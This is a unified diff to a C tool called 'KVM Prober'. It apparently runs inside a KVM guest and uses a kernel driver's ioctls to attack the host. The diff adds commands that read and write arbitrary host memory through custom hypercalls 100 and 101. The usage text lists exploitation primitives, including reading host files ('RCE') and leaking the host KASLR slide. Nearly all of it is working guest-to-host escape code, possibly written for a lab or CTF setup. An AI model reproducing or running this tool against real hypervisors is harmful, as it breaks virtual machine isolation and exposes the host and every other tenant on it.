@@ -67,10 +67,24 @@ struct hypercall_args {
     unsigned long arg1;
     unsigned long arg2;
     unsigned long arg3;
+    long ret_value;  // Return value from hypercall
 };
 
+// Helper: Get guest physical address from virtual
+unsigned long virt_to_phys_guest(int fd, void *virt_addr) {
+    unsigned long virt = (unsigned long)virt_addr;
+    unsigned long phys = virt;
+    
+    if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &phys) < 0) {
+        perror("virt_to_phys failed");
+        return 0;
+    }
+    
+    return phys;
+}
+
 void print_usage(char *prog_name) {
-    fprintf(stderr, "KVM Prober - FINAL VERSION (Proper Address Handling)\n\n");
+    fprintf(stderr, "KVM Prober - FINAL VERSION (Hypercall Buffer Support)\n\n");
     fprintf(stderr, "Usage: %s <command> [args...]\n\n", prog_name);
     
     fprintf(stderr, "=== GUEST Memory Operations (Guest Physical Address) ===\n");
@@ -91,9 +105,13 @@ void print_usage(char *prog_name) {
     fprintf(stderr, "  readport <port_hex> <size>           - Read I/O port\n");
     fprintf(stderr, "  writeport <port_hex> <val> <size>    - Write I/O port\n\n");
     
+    fprintf(stderr, "=== Hypercall Operations (UPDATED) ===\n");
+    fprintf(stderr, "  hypercall <nr> <a0> <a1> <a2> <a3>   - Execute hypercall (returns rax)\n");
+    fprintf(stderr, "  hypercall_read <host_addr> <size>    - Read from HOST via hypercall\n");
+    fprintf(stderr, "  hypercall_write <host_addr> <value>  - Write to HOST via hypercall\n\n");
+    
     fprintf(stderr, "=== Exploitation Primitives ===\n");
     fprintf(stderr, "  readfile <path> <offset> <length>    - Read HOST file (RCE)\n");
-    fprintf(stderr, "  hypercall <nr> <a0> <a1> <a2> <a3>   - Custom hypercall\n");
     fprintf(stderr, "  getkaslr                             - Get host KASLR slide\n\n");
     
     fprintf(stderr, "=== Address Translation ===\n");
@@ -105,11 +123,14 @@ void print_usage(char *prog_name) {
     fprintf(stderr, "  HPA = Host Physical Address (actual host RAM - for exploitation)\n");
     fprintf(stderr, "  MMIO = Memory-Mapped I/O (hardware/BARs, may access host via IVSHMEM)\n\n");
     
+    fprintf(stderr, "HYPERCALL PROTOCOL:\n");
+    fprintf(stderr, "  Hypercall 100 (WRITE): nr=100, arg0=host_addr, arg1=value\n");
+    fprintf(stderr, "  Hypercall 101 (READ):  nr=101, arg0=host_addr, arg1=guest_buffer_gpa, arg2=size\n");
+    fprintf(stderr, "  Return value (rax) = status/bytes processed\n\n");
+    
     fprintf(stderr, "EXPLOITATION NOTE:\n");
-    fprintf(stderr, "  To access HOST memory at 0x64279a8:\n");
-    fprintf(stderr, "    - Try: writehpa 64279a8 <hex>     (direct host access)\n");
-    fprintf(stderr, "    - Or:  writemmio_buf <bar+offset> (via IVSHMEM BAR)\n");
-    fprintf(stderr, "  DO NOT use writegpa - that only writes guest memory!\n");
+    fprintf(stderr, "  Hypercalls must use guest buffers for data transfer!\n");
+    fprintf(stderr, "  Host can't return pointers - use guest GPA as destination buffer\n");
 }
 
 unsigned char *hex_string_to_bytes(const char *hex_str, unsigned long *num_bytes) {
@@ -331,6 +352,112 @@ int main(int argc, char *argv[]) {
         else
             printf("Wrote 0x%X to port 0x%X\n", data.value, data.port);
 
+    // ===== Hypercall Operations (UPDATED) =====
+    } else if (strcmp(cmd, "hypercall") == 0) {
+        if (argc != 7) { print_usage(argv[0]); close(fd); return 1; }
+        struct hypercall_args args;
+        args.nr = strtoul(argv[2], NULL, 0);
+        args.arg0 = strtoul(argv[3], NULL, 0);
+        args.arg1 = strtoul(argv[4], NULL, 0);
+        args.arg2 = strtoul(argv[5], NULL, 0);
+        args.arg3 = strtoul(argv[6], NULL, 0);
+        args.ret_value = 0;
+        
+        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0)
+            perror("ioctl HYPERCALL_ARGS failed");
+        else
+            printf("Hypercall %lu executed\n  rax (return) = %ld (0x%lx)\n", 
+                   args.nr, args.ret_value, args.ret_value);
+
+    } else if (strcmp(cmd, "hypercall_read") == 0) {
+        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
+        
+        unsigned long host_addr = strtoul(argv[2], NULL, 16);
+        unsigned long size = strtoul(argv[3], NULL, 10);
+        
+        if (size == 0 || size > 4096) {
+            fprintf(stderr, "Invalid size (1-4096)\n");
+            close(fd);
+            return 1;
+        }
+        
+        // Allocate guest buffer
+        unsigned char *guest_buffer = malloc(size);
+        if (!guest_buffer) {
+            perror("malloc");
+            close(fd);
+            return 1;
+        }
+        
+        // Get guest physical address of buffer
+        unsigned long guest_gpa = virt_to_phys_guest(fd, guest_buffer);
+        if (!guest_gpa) {
+            fprintf(stderr, "Failed to get GPA of guest buffer\n");
+            free(guest_buffer);
+            close(fd);
+            return 1;
+        }
+        
+        printf("[*] Hypercall READ from HOST 0x%lX to guest buffer @ GPA 0x%lX\n", 
+               host_addr, guest_gpa);
+        
+        // Execute hypercall: READ (nr=101)
+        struct hypercall_args args;
+        args.nr = 101;
+        args.arg0 = host_addr;        // Host physical address to read
+        args.arg1 = guest_gpa;         // Guest buffer (as GPA)
+        args.arg2 = size;              // Size
+        args.arg3 = 0;
+        args.ret_value = 0;
+        
+        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0) {
+            perror("ioctl HYPERCALL_ARGS failed");
+            free(guest_buffer);
+            close(fd);
+            return 1;
+        }
+        
+        printf("[+] Hypercall returned: %ld bytes\n", args.ret_value);
+        
+        if (args.ret_value > 0) {
+            printf("[+] Data from host:\n");
+            for (long i = 0; i < args.ret_value && i < (long)size; ++i) {
+                printf("%02X", guest_buffer[i]);
+                if ((i + 1) % 16 == 0) printf("\n");
+            }
+            printf("\n");
+            
+            printf("[+] ASCII: ");
+            for (long i = 0; i < args.ret_value && i < (long)size; ++i) {
+                printf("%c", (guest_buffer[i] >= 32 && guest_buffer[i] < 127) ? guest_buffer[i] : '.');
+            }
+            printf("\n");
+        }
+        
+        free(guest_buffer);
+
+    } else if (strcmp(cmd, "hypercall_write") == 0) {
+        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
+        
+        unsigned long host_addr = strtoul(argv[2], NULL, 16);
+        unsigned long value = strtoul(argv[3], NULL, 16);
+        
+        printf("[*] Hypercall WRITE 0x%lX to HOST 0x%lX\n", value, host_addr);
+        
+        // Execute hypercall: WRITE (nr=100)
+        struct hypercall_args args;
+        args.nr = 100;
+        args.arg0 = host_addr;
+        args.arg1 = value;
+        args.arg2 = 0;
+        args.arg3 = 0;
+        args.ret_value = 0;
+        
+        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0)
+            perror("ioctl HYPERCALL_ARGS failed");
+        else
+            printf("[+] Hypercall returned: %ld (0x%lx)\n", args.ret_value, args.ret_value);
+
     // ===== Exploitation Primitives =====
     } else if (strcmp(cmd, "readfile") == 0) {
         if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
@@ -356,20 +483,6 @@ int main(int argc, char *argv[]) {
         }
         free(path);
         free(buffer);
-
-    } else if (strcmp(cmd, "hypercall") == 0) {
-        if (argc != 7) { print_usage(argv[0]); close(fd); return 1; }
-        struct hypercall_args args;
-        args.nr = strtoul(argv[2], NULL, 0);
-        args.arg0 = strtoul(argv[3], NULL, 0);
-        args.arg1 = strtoul(argv[4], NULL, 0);
-        args.arg2 = strtoul(argv[5], NULL, 0);
-        args.arg3 = strtoul(argv[6], NULL, 0);
-        long ret = 0;
-        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0)
-            perror("ioctl HYPERCALL_ARGS failed");
-        else
-            printf("Hypercall %lu executed, ret=%ld\n", args.nr, ret);
 
     } else if (strcmp(cmd, "getkaslr") == 0) {
         unsigned long slide = 0;
